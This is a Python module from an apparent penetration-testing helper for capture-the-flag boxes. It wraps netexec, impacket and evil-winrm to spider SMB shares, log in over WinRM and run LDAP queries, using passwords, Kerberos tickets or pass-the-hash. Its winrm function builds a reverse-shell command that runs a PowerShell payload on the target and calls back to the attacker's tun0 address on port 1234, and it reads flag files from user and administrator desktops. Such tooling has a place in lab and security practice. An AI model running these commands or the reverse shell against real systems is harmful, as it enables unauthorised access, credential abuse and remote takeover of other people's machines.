import os 
import config, payload

def smb_view(box, path):
    if config.HELP:    
        print("""
Action:\t[Protocol] smb
Tool:\tnetexec, impacket
Option:\t-u, --username
\t-p --password; -H, --hash; -k
Desc:\t1. Lists all existing SMB shares with permissions
\t2. Lists all readable file names and stores them in a file under enum/
\t3. Displays a command that can be used to log in via SMB
Info:\t/
        """)
        return 0
    config.required_creds(box)
    os.chdir(path.ws_enum)
    print('\033[93m[*]\033[0m List SMB shares & files')
    if isinstance(box.krb, str):
        cmd = f"{box.krb_ccache} netexec smb {box.fqdn} --use-kcache --shares"
        cmd2 = f"{box.krb_ccache} netexec smb {box.fqdn} --use-kcache -M spider_plus"
        cmd3 = f"{box.krb_ccache} impacket-smbclient -k -no-pass {box.fqdn}"
    elif box.krb:
        cmd = f"netexec smb {box.fqdn} -u {box.username} -p {box.password} -k --shares"
        cmd2 = f"netexec smb {box.fqdn} -u {box.username} -p {box.password} -k -M spider_plus"
        cmd3 = f"impacket-smbclient -k {box.domain}/{box.username}:{box.password}@{box.fqdn}"
    elif box.nt_hash:
        cmd = f"netexec smb {box.fqdn} -u {box.username} -H {box.nt_hash} --shares"
        cmd2 = f"netexec smb {box.fqdn} -u {box.username} -H {box.nt_hash} -M spider_plus"
        cmd3 = f"impacket-smbclient {box.domain}/{box.username}@{box.fqdn} -hashes :{box.nt_hash}"
    else:
        cmd = f"netexec smb {box.fqdn} -u {box.username} -p {box.password} --shares"
        cmd2 = f"netexec smb {box.fqdn} -u {box.username} -p {box.password} -M spider_plus"
        cmd3 = f"impacket-smbclient {box.domain}/{box.username}:{box.password}@{box.fqdn}"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    filter = " | awk '/Share/ {f=1} f' | sed 's/^SMB.*"+box.hostname+"[[:space:]]\\+//'"
    os.system(cmd+filter+f' | tee {box.username}_smb-shares.txt')
    print(f'\n\033[96m[$]\033[0m {cmd2}')
    out = os.popen(cmd2).read()
    print('\n'.join(out.splitlines()[-10:]))
    os.system(f'cp /home/kali/.nxc/modules/nxc_spider_plus/{box.fqdn}.json .')
    print(f'[*] Output file: /home/kali/.nxc/modules/nxc_spider_plus/{box.fqdn}.json')
    print(f'\n\033[96m[$]\033[0m {cmd3}')
    print('\033[92m[+]\033[0m List SMB shares\n')

def winrm(box, path, cmd):
    if config.HELP:    
        print("""
Action:\t[Protocol] winrm
Tools:\tevil-winrm
Option:\t-u, --username
\t-p --password; -H, --hash; -k
\t-x, --cmd (Optional)
\t-t, --target (Optional)
Desc:\tLogs in via WinRM.\n\tOptionally execute a command or as the specified target.
\t ~ user = read user.txt from the current Desktop folder
\t ~ root = read root.txt from the administrator Desktop folder
\t ~ rs   = open a reverse shell for this user or target
Info:\tWhen passing commands with options, the shell closes or hangs.
        """)
        return 0
    config.required_creds(box)
    #os.chdir(path.ws_scr)
    print('\033[93m[*]\033[0m Login to WinRm (run CMD)')
    ps_cmd = ""
    if cmd:
        if cmd.replace(".txt","") == "user":
            ps_cmd = f'''echo "gc (join-path ([Environment]::GetFolderPath('Desktop')) user.txt)" | '''
        elif cmd.replace(".txt","") == "root":
            ps_cmd = f'''echo "type /Users/Administrator/Desktop/root.txt" | '''
        elif cmd == "rs":
            # pass via cmd=rs-ps or rs-runas (to do)
            username = box.username
            password = box.password
            if box.target:
                if ":" not in box.target:
                    print("\033[91m[!]\033[0m Separate username and password with :")
                    exit()
                username, password = box.target.split(":", 1)
            ip = config.get_tun0_ip()
            port = "1234"
            print(f'[*] Run revshell as {username} : {password}')
            print(f'[*] Start listener on {ip}:{port}')
            ps_cmd = f'''echo "$c=New-Object PSCredential('{box.domain}\\{username}',(ConvertTo-SecureString '{password}' -AsPlainText -Force)); icm {box.hostname} -Cred $c {{ cmd /c {payload.revshell_ps(username, password, ip, port)} }}" | '''.replace('$', '\\$')

    if box.krb or isinstance(box.krb, str):
        cmd = f"{ps_cmd}{box.krb_ccache} evil-winrm -i {box.fqdn} -r {box.domain}"
    elif box.nt_hash:
        cmd = f"{ps_cmd}evil-winrm -i {box.fqdn} -u {box.username} -H {box.nt_hash}"
    else:
        cmd = f"{ps_cmd}evil-winrm -i {box.fqdn} -u {box.username} -p {box.password}"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd)
    print('\033[92m[+]\033[0m Login to WinRm')

def ldap(box, path, cmd):
    if config.HELP:    
        print("""
Action:\t[Protocol] ldap
Tool:\tnetexec
Option:\t-u, --username
\t-p, --password; -H, --hash; -k
\t-x, --cmd (Optional)
Desc:\tLogs in via LDAP.\n\tSend a query but no filter is set.
Info:\t/
        """)
        return 0
    config.required_creds(box)
    os.chdir(path.ws_enum)
    print('\033[93m[*]\033[0m Login to LDAP (run Query)')
    ps_cmd = ""
    if cmd:
        if cmd == "?":
            pass
        else:
            query = f"--query '{cmd}' ''"
    if isinstance(box.krb, str):
        cmd = f"{box.krb_ccache} netexec ldap {box.fqdn} --use-kcache {query}"
    elif box.krb:
        cmd = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} -k {query}"
    elif box.nt_hash:
        cmd = f"netexec ldap {box.fqdn} -u {box.username} -H {box.nt_hash} {query}"
    else:
        cmd = f"netexec ldap {box.fqdn} -u {box.username} -p {box.password} {query}"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd)
    print('\033[92m[+]\033[0m Login to LDAP')
